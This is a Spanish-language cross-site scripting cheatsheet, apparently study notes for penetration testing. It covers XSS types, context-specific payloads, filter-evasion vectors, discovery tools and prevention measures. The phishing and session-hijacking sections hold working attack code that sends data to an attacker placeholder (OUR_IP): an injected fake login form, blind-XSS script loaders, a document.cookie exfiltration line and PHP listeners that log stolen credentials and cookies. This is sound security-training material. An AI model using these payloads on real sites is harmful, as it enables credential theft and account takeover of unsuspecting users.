# XSS — Cheatsheet

## Tipos de XSS — Referencia Rapida

| Tipo | Persistente | Procesado en | Vector de ataque |
|------|-------------|--------------|-------------------|
| **Stored** | Si | Back-end + Browser | Payload guardado en BD, afecta a todos los usuarios |
| **Reflected** | No | Back-end | URL maliciosa enviada a la victima |
| **DOM-based** | No | Browser (solo JS) | URL con `#`, sin request HTTP |

---

## Payloads de Verificacion

```html
<!-- Basico - confirmar ejecucion JS -->
<script>alert(window.origin)</script>

<!-- Cuando <script> esta bloqueado (innerHTML, DOM) -->
<img src="" onerror=alert(window.origin)>

<!-- Alternativas si alert() esta bloqueado -->
<script>print()</script>
<plaintext>
```

**Por que `window.origin`?** Revela exactamente en que dominio/iframe se ejecuto el payload — util cuando hay iframes de dominios cruzados (una app puede embeber un formulario vulnerable de otro dominio).

---

## Identificar el Tipo de XSS

```
¿El input aparece en la pagina?
├── ¿Se hace un HTTP request? (ver Network tab en DevTools -> CTRL+SHIFT+I)
│   ├── SI → Reflected o Stored
│   │   └── ¿Persiste tras recargar la pagina?
│   │       ├── SI → **Stored XSS**
│   │       └── NO → **Reflected XSS** (copiar la URL del request GET para explotar)
│   └── NO (URL usa #, no hay request) → **DOM-based XSS**
```

- `CTRL+U` → fuente estatica (no muestra cambios hechos por JS/DOM).
- `CTRL+SHIFT+C` → Web Inspector, muestra el DOM ya renderizado (aqui si aparece el payload de DOM XSS).

---

## DOM XSS — Source & Sink

**Source** = donde entra el input del usuario:
```javascript
document.URL.indexOf("task=")   // parametro leido directamente de la URL
```

**Sink** = donde se escribe al DOM sin sanitizar (funcion peligrosa):
```javascript
// JavaScript nativo
document.write()
document.writeln()
element.innerHTML     // NO permite <script>, usar <img onerror> u otro event handler
element.outerHTML
document.domain

// jQuery
.html() .parseHTML() .add() .after() .append() .prepend()
.before() .insertAfter() .insertBefore() .replaceAll() .replaceWith()
```

**Regla:** Source + Sink sin sanitizacion = XSS.

Ejemplo real (To-Do list vulnerable):
```javascript
var pos = document.URL.indexOf("task=");
var task = document.URL.substring(pos + 5, document.URL.length);
document.getElementById("todo").innerHTML = "<b>Next Task:</b> " + decodeURIComponent(task);
```

---

## Reflected XSS — Explotar via URL

Si el request es `GET`, el payload viaja en la URL:
```
http://target.com/index.php?task=<script>alert(window.origin)</script>
```
Enviar esta URL a la victima — al visitarla, el payload se ejecuta una unica vez (no persiste al recargar).

---

## Contextos de Inyeccion — Que Payload Usar

| Contexto en el HTML | Ejemplo de codigo vulnerable | Payload |
|----------------------|-------------------------------|---------|
| Texto plano / HTML body | `<div>INPUT</div>` | `<script>alert(window.origin)</script>` |
| Dentro de un atributo | `<input value="INPUT">` | `"><img src=x onerror=alert(window.origin)>` |
| Atributo sin comillas | `<input value=INPUT>` | ` onmouseover=alert(1) x=` |
| Dentro de `<script>...</script>` | `var x = "INPUT";` | `";alert(window.origin);//` |
| Sink `innerHTML` (bloquea `<script>`) | `el.innerHTML = INPUT` | `<img src="" onerror=alert(window.origin)>` |
| Dentro de un comentario HTML | `<!-- INPUT -->` | `--><script>alert(1)</script><!--` |
| Atributo `href`/`src` | `<a href="INPUT">` | `javascript:alert(document.domain)` |

---

## Evasion de Filtros

Usar cuando `<script>` o `alert(` estan bloqueados por WAF/sanitizacion basica:

```html
<!-- Sin la palabra "script" -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe src="javascript:alert(1)">

<!-- Mayusculas / mixed case (filtros case-sensitive) -->
<ScRiPt>alert(1)</sCriPt>

<!-- Sin espacios (usar / o tabs/newlines) -->
<svg/onload=alert(1)>
<img/src=x/onerror=alert(1)>

<!-- Sin parentesis -->
<svg onload=alert`1`>

<!-- Doble encoding / entidades HTML en atributos -->
<img src=x onerror=&#97;lert(1)>

<!-- Bypass de innerHTML (no permite <script>) -->
<img src="" onerror=alert(window.origin)>
```

Listas completas de payloads y bypasses:
- [PayloadsAllTheThings — XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md)
- [Payload-Box](https://github.com/payload-box/xss-payload-list)

---

## XSS Discovery

### Herramientas Automaticas

| Herramienta | Tipo | Comando clave |
|-------------|------|----------------|
| [XSStrike](https://github.com/s0md3v/XSStrike) | Open-source | `python xsstrike.py -u "http://target/page?param=test"` |
| [BruteXSS](https://github.com/rajeshmajumdar/BruteXSS) | Open-source | — |
| [XSSer](https://github.com/epsylon/xsser) | Open-source | — |
| Burp Pro / ZAP / Nessus | Paid/Free | Passive scan (revisa DOM) + Active scan (inyecta payloads) |

```bash
# Instalar y usar XSStrike
git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike && pip install -r requirements.txt
python xsstrike.py -u "http://TARGET/index.php?task=test"
```

**Nota:** los scanners no siempre son 100% precisos (un payload reflejado no implica ejecucion real) — siempre verificar manualmente.

### Manual — Donde Inyectar

- Campos de formulario (comentarios, busqueda, tareas, registro)
- Parametros en URL (`?q=`, `?task=`, `?search=`)
- HTTP Headers reflejados en la pagina: `Cookie`, `User-Agent`, `Referer`
- Fragmentos de URL con `#` (candidato a DOM XSS)

### Code Review — Palabras Clave Peligrosas

**Front-end (JS):** `innerHTML`, `outerHTML`, `document.write()`, `document.writeln()`, `.append()`, `.html()`, `eval()`, `location.href`, `document.domain`

**Back-end:** cualquier punto donde el input del usuario se concatena directamente en la respuesta HTML sin `htmlentities`/`htmlspecialchars`/equivalente.

**Verificar fuente renderizada:** `CTRL+SHIFT+C` (DOM ya procesado) vs `CTRL+U` (fuente estatica, no refleja cambios por JS).

---

## Impacto Real de XSS

| Ataque | Descripcion |
|--------|-------------|
| **Session Hijacking** | Robar cookie de sesion → `document.cookie` |
| **Credential Theft** | Inyectar formulario falso de login |
| **Keylogger** | Capturar teclas con event listeners (`addEventListener('keypress', ...)`) |
| **Phishing** | Redirigir o suplantar contenido de la pagina |
| **CSRF forzado** | Ejecutar API calls autenticadas en nombre del usuario |
| **Crypto mining** | Usar CPU del navegador de la victima |
| **Browser exploit** | Combinar con vuln del browser para lograr RCE |

**Riesgo:** Bajo impacto directo en el back-end pero alta probabilidad de explotacion → clasificado normalmente como **riesgo MEDIO**, siempre remediar.

---

## Defacing (tipico en Stored XSS)

```javascript
// Color de fondo
document.body.style.background = "#141d2b"

// Imagen de fondo
document.body.background = "https://example.com/img.svg"

// Titulo de la pestaña
document.title = 'Hacked'

// Reemplazar todo el contenido del body
document.getElementsByTagName('body')[0].innerHTML = '<center><h1>Hacked</h1></center>'

// Con jQuery (si esta importado en la pagina)
$("#todo").html('New Text');
```

**Payload completo:**
```html
<script>document.getElementsByTagName('body')[0].innerHTML = '<center><h1 style="color:white">Hacked</h1></center>'</script>
```

---

## Phishing — Formulario Falso de Login

**1. Construir el formulario:**
```html
<h3>Please login to continue</h3>
<form action=http://OUR_IP>
    <input type="text" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <input type="submit" name="submit" value="Login">
</form>
```

**2. Inyectarlo con `document.write()` y limpiar el formulario original:**
```javascript
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="text" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
document.getElementById('urlform').remove();
```

- Agregar `<!--` al final del payload para comentar HTML residual de la pagina original.
- Usar `CTRL+SHIFT+C` para inspeccionar y encontrar el `id` exacto del elemento a remover.

**3. Capturar credenciales con un listener PHP:**
```bash
mkdir /tmp/tmpserver && cd /tmp/tmpserver
```
```php
<?php
// index.php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/phishing/index.php");
    fclose($file);
    exit();
}
?>
```
```bash
sudo php -S 0.0.0.0:80
```

---

## Session Hijacking (Blind XSS)

**Blind XSS** = la vulnerabilidad se ejecuta en una pagina a la que no tenemos acceso directo (panel de admin, tickets de soporte, logs internos).

Posibles vectores de entrada ciegos: contact forms, reviews, user details, support tickets, header `User-Agent`.

### Paso 1 — Identificar el campo vulnerable

Script remoto que reporta el nombre del campo desde el que se disparo:
```html
<script src=http://OUR_IP/fullname></script>
<script src=http://OUR_IP/username></script>
<script src=http://OUR_IP/website></script>
```

Otros formatos de payload Blind XSS (utiles para bypass de filtros basicos):
```html
'><script src=http://OUR_IP></script>
"><script src=http://OUR_IP></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
<script>$.getScript("http://OUR_IP")</script>
```

Iniciar listener:
```bash
mkdir /tmp/tmpserver && cd /tmp/tmpserver
sudo php -S 0.0.0.0:80
```

### Paso 2 — Robar la cookie de sesion

`script.js` alojado en nuestro servidor:
```javascript
new Image().src='http://OUR_IP/index.php?c='+document.cookie
```

Payload XSS que carga el script:
```html
<script src=http://OUR_IP/script.js></script>
```

PHP para capturar y guardar cookies (`index.php`):
```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

### Paso 3 — Usar la cookie robada

Firefox → `Shift+F9` → Storage → agregar cookie manualmente:
- `Name` = parte antes del `=`
- `Value` = parte despues del `=`

Recargar la pagina para quedar autenticado como la victima.

**Nota:** si la cookie tiene el flag `HttpOnly`, `document.cookie` no la puede leer — este ataque no funcionara (ver Prevencion).

---

## Prevencion — Resumen Rapido

| Capa | Medida | Detalle |
|------|--------|---------|
| Front-end | Input validation | Regex/formato esperado (ej. email) antes de enviar |
| Front-end | Input sanitization | [DOMPurify](https://github.com/cure53/DOMPurify): `DOMPurify.sanitize(dirty)` |
| Back-end | Input validation | Rechazar input que no matchee el formato esperado (nunca confiar solo en el front-end) |
| Back-end | Input sanitization | PHP `addslashes()`; Node `DOMPurify.sanitize()` |
| Back-end | Output encoding | PHP `htmlentities()` / `htmlspecialchars()`; Node `html-entities` → `<` pasa a `&lt;` |
| Server config | Headers | `Content-Security-Policy: script-src 'self'`, `X-Content-Type-Options: nosniff` |
| Server config | Cookies | Flags `HttpOnly` (bloquea `document.cookie`) y `Secure` (solo HTTPS) |
| Server config | HTTPS | Forzar HTTPS en todo el dominio |
| Infra | WAF | Detecta y bloquea patrones de inyeccion en requests HTTP |

**Nunca** insertar input de usuario sin sanitizar dentro de: `<script>`, `<style>`, atributos de tags (`<div name='INPUT'>`), o comentarios HTML (`<!-- INPUT -->`).

**Evitar en el codigo:** `innerHTML`, `outerHTML`, `document.write()`, `document.writeln()`, `document.domain` y los equivalentes de jQuery (`html()`, `append()`, `prepend()`, `after()`, `before()`, `replaceWith()`, etc).

---

## Limitaciones a Recordar

- XSS esta limitado al motor JS del browser (V8, SpiderMonkey, etc.)
- En browsers modernos: limitado al mismo dominio (Same-Origin Policy)
- `innerHTML` bloquea tags `<script>` → usar `<img onerror>` u otro event handler
- Stored XSS puede requerir eliminar el payload directamente de la BD para remediarlo
- Cookie con flag `HttpOnly` → no se puede robar con `document.cookie`

---

## Metodologia — Quick Reference

```
--- Discovery ---
1. Identificar inputs (forms, URL params, headers, User-Agent)
2. Probar: <script>alert(window.origin)</script>
3. Si bloqueado: <img src="" onerror=alert(window.origin)> u otro vector de la tabla de contextos
4. Ver Network tab (CTRL+SHIFT+I): ¿hay HTTP request? → determina Reflected/Stored vs DOM
5. Recargar pagina → ¿persiste? → Stored vs Reflected
6. Revisar URL con # y ausencia de requests → DOM-based
7. Para Reflected/DOM: construir URL maliciosa para la victima
8. Para Stored: verificar que el payload afecta a otros usuarios

--- Explotacion ---
9.  Defacing        → document.body.style.background / innerHTML (Stored)
10. Phishing        → document.write(form) + listener PHP (Reflected/Stored)
11. Session Hijack   → Blind XSS: script src + new Image().src + robo de cookie (Blind/Stored)

--- Remediacion ---
12. Validar y sanitizar input en front-end Y back-end
13. Codificar output (htmlentities/html-entities)
14. Configurar CSP, HttpOnly, Secure, HTTPS
```

Referencia visual adicional: [[Cross-Site Scripting (XSS) - cheatsheet.pdf]]
